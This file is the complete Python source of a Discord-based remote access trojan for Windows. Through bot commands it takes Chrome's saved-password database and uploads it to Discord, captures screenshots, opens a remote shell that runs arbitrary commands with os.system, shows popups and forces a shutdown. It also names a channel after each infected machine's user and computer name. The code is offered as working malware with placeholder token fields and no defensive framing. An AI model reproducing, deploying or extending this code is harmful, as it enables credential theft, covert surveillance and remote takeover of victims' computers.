import discord
from discord.ext import commands
from discord.ui import View
import ctypes
import os
import mss
import io
import tempfile
import subprocess

MAINCHANNEL = 123456 #change this with your main channel id in your server
DISCORDTOKEN = "123456" #change this with your discord token

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_message(message):
    global channelid

    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

    if message.content == "Starting Service...":

        guild = message.guild
        for channel in guild.channels:
            if channel.id != MAINCHANNEL:
                await channel.delete()

        channelname = os.getlogin() + "-" + os.environ["COMPUTERNAME"]

        channel = await guild.create_text_channel(channelname)

        if channel:
            print(f"Created channel: {channelname} with channel id {channel.id}")

        channelid = channel.id

        await message.delete()
        await message.channel.send("Channels created!", delete_after=2)
    
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
    

    if message.content == "Sending Command #1 - Popup" and message.channel.id == channelid:
        await message.channel.send("Message:", delete_after=5)
        popupmessage = await bot.wait_for('message')
        ctypes.windll.user32.MessageBoxW(0, popupmessage.content, "Message", 1)
        await message.delete()
        await message.channel.send("User has dismissed message box", delete_after=5)

    elif message.content == "Sending Command #2 - Password Stealer" and message.channel.id == channelid:
        username = os.getlogin()
        try:
            passwords = open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "rb").read()

            await message.channel.send("Password Stealer:", file=discord.File(io.BytesIO(passwords), filename="passwords.db"))
            await message.delete()
            await message.channel.send("Command Completed!", delete_after=5)

        except FileNotFoundError:
            await message.channel.send("No passwords found!", delete_after=5)
            return
        
    elif message.content == "Sending Command #3 - Screenshot" and message.channel.id == channelid:
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            img = mss.tools.to_png(screenshot.rgb, screenshot.size)

        with io.BytesIO(img) as temp_file:
            temp_file.seek(0)
            picture = discord.File(temp_file, filename="screenshot.png")
        
        await message.channel.send("Screenshot:", file=picture)
        await message.delete()
        await message.channel.send("Command Completed!", delete_after=5)

    elif message.content == "Sending Command #4 - Execute Commands" and message.channel.id == channelid:
        await message.channel.send("Entered shell, 'exit' to stop the terminal output. Do not run any other commands from the option menu while in shell.")
        current_directory = os.getcwd()
        while True:
            command = await bot.wait_for('message')
            command = command.content
            if command == "exit":
                await message.channel.send("Exited shell...", delete_after=5)
                break
            else:
                if command.startswith("cd "):
                    try:
                        new_directory = command[3:].strip()
                        os.chdir(new_directory)
                        current_directory = os.getcwd()
                        await message.channel.send(f"Changed directory to {current_directory}")
                    except FileNotFoundError:
                        await message.channel.send(f"Directory not found: {new_directory}")
                    except Exception as e:
                        await message.channel.send(f"Error changing directory: {str(e)}")
                else:
                    with tempfile.NamedTemporaryFile(delete=True) as temp_file:
                        temp_file_name = temp_file.name

                os.system(f"cd {current_directory} && {command} > {temp_file_name}")

                with open(temp_file_name, "r") as f:
                    output = f.read()

                if output == "":
                    await message.channel.send("Command completed, but no output was given.")
                else:
                    await message.channel.send(f"```{output}```")

    elif message.content == "Sending Command #5 - Shutdown" and message.channel.id == channelid:
        await message.channel.send("Shutting down...", delete_after=5)
        await message.delete()
        subprocess.run("shutdown /s /t 1")
        return

    await bot.process_commands(message)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} - {bot.user.id}')
    
bot.run(DISCORDTOKEN)
